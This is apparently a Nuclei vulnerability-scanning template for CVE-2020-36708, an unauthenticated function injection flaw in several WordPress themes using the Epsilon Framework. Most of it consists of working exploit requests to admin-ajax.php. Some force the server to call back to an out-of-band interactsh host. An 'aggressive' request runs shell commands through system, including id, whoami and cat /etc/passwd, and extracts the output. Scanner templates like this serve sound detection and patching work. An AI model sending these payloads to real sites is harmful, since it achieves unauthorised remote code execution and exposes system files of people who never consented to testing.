id: cve-2020-36708

info:
  name: WordPress Epsilon Framework - Unauthenticated Function Injection
  author: six
  severity: critical
  description: |
    Multiple WordPress themes including Shapely <= 1.2.7, NewsMag <= 2.4.1, Activello <= 1.4.0, Illdy <= 2.1.4, Allegiant <= 1.2.2, Newspaper X <= 1.3.1, Pixova Lite <= 2.0.5, Brilliance <= 1.2.7, MedZone Lite <= 1.2.4, Regina Lite <= 2.0.4, Transcend <= 1.1.8, Affluent <= 1.1.0, Bonkers <= 1.0.4, Antreas <= 1.0.2, Sparkling <= 2.4.8, and NatureMag Lite <= 1.0.4 contain a function injection vulnerability in epsilon_framework_ajax_action, epsilon_dashboard_ajax_callback, or welcome_screen_ajax_callback, allowing unauthenticated attackers to call arbitrary functions and achieve remote code execution.
  reference:
    - https://blog.nintechnet.com/unauthenticated-function-injection-vulnerability-fixed-in-15-wordpress-themes/
    - https://blog.nintechnet.com/unauthenticated-function-injection-vulnerability-in-wordpress-sparkling-theme/
    - https://www.exploit-db.com/exploits/49327
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36708
  classification:
    cvss-score: 9.8
    cve-id: CVE-2020-36708
    cwe-id: CWE-94
  metadata:
    verified: true
    max-request: 4
    vendor: epsilon-framework
    product: multiple-wordpress-themes
    timeout: 30s
    max-size: 1MB
  tags: cve,wordpress,ssrf,rce,critical

variables:
  endpoint: "/wp-admin/admin-ajax.php"

preprocessors:
  - randstr:
      name: marker
      length: 8
      charset: "abcdefghijklmnopqrstuvwxyz0123456789"

http:
  - name: epsilon-oob-form
    method: POST
    path:
      - "{{BaseURL}}{{endpoint}}"
    headers:
      User-Agent: "{{UserAgent}}"
      Content-Type: application/x-www-form-urlencoded
      Accept: "*/*"
    payloads:
      action:
        - epsilon_framework_ajax_action
        - epsilon_dashboard_ajax_callback
        - welcome_screen_ajax_callback
    body: |
      action={{action}}&args[action][0]=Requests&args[action][1]=request_multiple&args[args][0][url]=http://{{interactsh-url}}/

  - name: epsilon-oob-json
    method: POST
    path:
      - "{{BaseURL}}{{endpoint}}"
    headers:
      User-Agent: "{{UserAgent}}"
      Content-Type: application/json
      Accept: application/json
    payloads:
      action:
        - epsilon_framework_ajax_action
        - epsilon_dashboard_ajax_callback
        - welcome_screen_ajax_callback
    body: |
      {"action":"{{action}}","args":{"action":["Requests","request_multiple"],"args":[{"url":"http://{{interactsh-url}}/"}]}}

  - name: epsilon-oob-multipart
    method: POST
    path:
      - "{{BaseURL}}{{endpoint}}"
    headers:
      User-Agent: "{{UserAgent}}"
      Content-Type: "multipart/form-data; boundary=----nuclei{{marker}}"
      Accept: "*/*"
    payloads:
      action:
        - epsilon_framework_ajax_action
        - epsilon_dashboard_ajax_callback
        - welcome_screen_ajax_callback
    body: |
      ------nuclei{{marker}}
      Content-Disposition: form-data; name="action"

      {{action}}
      ------nuclei{{marker}}
      Content-Disposition: form-data; name="args[action][0]"

      Requests
      ------nuclei{{marker}}
      Content-Disposition: form-data; name="args[action][1]"

      request_multiple
      ------nuclei{{marker}}
      Content-Disposition: form-data; name="args[args][0][url]"

      http://{{interactsh-url}}/
      ------nuclei{{marker}}--

  - name: epsilon-inband-aggressive
    method: POST
    path:
      - "{{BaseURL}}{{endpoint}}"
    headers:
      User-Agent: "{{UserAgent}}"
      Content-Type: application/x-www-form-urlencoded
      Accept: "*/*"
    attack: clusterbomb
    payloads:
      action:
        - epsilon_framework_ajax_action
        - epsilon_dashboard_ajax_callback
        - welcome_screen_ajax_callback
      cmd:
        - "echo nuclei_inband_{{marker}};id"
        - "echo nuclei_inband_{{marker}};whoami"
        - "echo nuclei_inband_{{marker}};uname -a"
        - "echo nuclei_inband_{{marker}};cat /etc/passwd|head -n1"
    body: |
      action={{action}}&args[action][0]=system&args[action][1]=call&args[args][0]={{cmd}}
    stop-at-first-match: true
    matchers:
      - type: dsl
        name: inband-rce
        dsl:
          - "status_code == 200"
          - 'contains(body, "nuclei_inband_")'
          - '(contains(body, "uid=") || contains(body, "root:") || contains(body, "Linux") || contains(body, "www-data"))'
        condition: and

matchers-condition: or
matchers:
  - type: word
    name: oob-callback
    part: interactsh_protocol
    words:
      - http
  - type: dsl
    name: inband-rce-global
    dsl:
      - 'contains(body, "nuclei_inband_")'
      - '(contains(body, "uid=") || contains(body, "root:") || contains(body, "Linux") || contains(body, "www-data"))'
    condition: and

extractors:
  - type: kval
    name: interact_details
    part: interactsh_request
  - type: regex
    name: inband_output
    part: body
    regex:
      - "nuclei_inband_[a-z0-9]+.*"
      - 'Linux[^\\n]{0,120}'
      - "root:.*:0:0:"

stop-at-first-match: true
